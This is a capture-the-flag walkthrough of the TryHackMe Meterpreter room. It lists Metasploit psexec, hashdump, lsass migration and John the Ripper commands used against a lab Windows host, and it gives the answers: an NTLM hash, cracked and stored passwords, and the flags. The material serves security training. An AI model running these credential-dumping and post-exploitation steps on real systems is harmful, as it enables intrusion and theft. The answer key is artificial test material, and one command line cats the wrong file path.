---
description: https://tryhackme.com/room/meterpreter
---

# Metasploit: Meterpreter

## Task 5 Post-Exploitation Challenge

```
msfconsole
msf > use exploit/windows/smb/psexec
msf > set RHOSTS 10.10.57.161
msf > set SMBUSER ballen
msf > set SMBPASS Password1
msf > set LHOST 10.6.9.176
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-38-40.png>)

#### What is the computer name?

```bash
sysinfo
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-47-12.png>)

{% hint style="success" %}
`ACME-TEST`
{% endhint %}

#### What is the target domain?

{% hint style="success" %}
FLASH
{% endhint %}

#### What is the name of the share likely created by the user?

```bash
meterpreter > shell
net share
exit
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-51-06.png>)

{% hint style="success" %}
`speedster`
{% endhint %}

#### What is the NTLM hash of the jchambers user?

* <mark style="color:red;">Works on AttackBox</mark>

```bash
ps lsass.exe
migrate 756
hashdump
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 21-12-32.png>)

{% hint style="success" %}
`69596c7aa1e8daee17f8e78870e25a5c`
{% endhint %}

#### What is the cleartext password of the jchambers user?

```bash
echo 'jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::' > hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 21-15-36.png>)

{% hint style="success" %}
`Trustno1`
{% endhint %}

#### Where is the "secrets.txt" file located?

```bash
search -d C:\\ -f secrets.txt
cat 'C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt'
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-42-53.png>)

{% hint style="success" %}
`C:\Program Files (x86)\Windows Multimedia Platform\`
{% endhint %}

#### What is the Twitter password revealed in the "secrets.txt" file?

{% hint style="success" %}
`KDSvbsw3849!`
{% endhint %}

#### Where is the "realsecret.txt" file located?

```bash
search -d C:\\ -f realsecret.txt
cat 'C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt'
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-45-40.png>)

{% hint style="success" %}
`C:\inetpub\wwwroot\`
{% endhint %}

#### What is the real secret?

{% hint style="success" %}
`The Flash is the fastest man alive`
{% endhint %}
